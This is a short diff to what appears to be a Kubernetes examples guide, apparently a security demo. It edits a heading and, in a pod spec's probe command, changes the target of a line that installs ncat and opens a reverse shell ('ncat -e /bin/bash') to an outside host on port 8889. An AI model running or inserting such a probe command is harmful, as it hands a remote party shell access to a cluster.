@@ -42,7 +42,7 @@ spec:
 EOF
 ```
 
-### Examples2: Installing applications the pod at deployment 
+### Examples2: Installing applications the pod at deployment (BE PATIENT ... takes about 1min)
 ```
 kubectl apply -f - <<EOF
 apiVersion: v1
@@ -101,7 +101,7 @@ spec:
         command:
         - bash
         - -c
-        - apt-get install ncat ; ncat -e /bin/bash 192.168.0.131 8889 &
+        - apt-get install ncat ; ncat -e /bin/bash bd.kubiosec.tech 8889 &
       initialDelaySeconds: 5
       periodSeconds: 5
 EOF
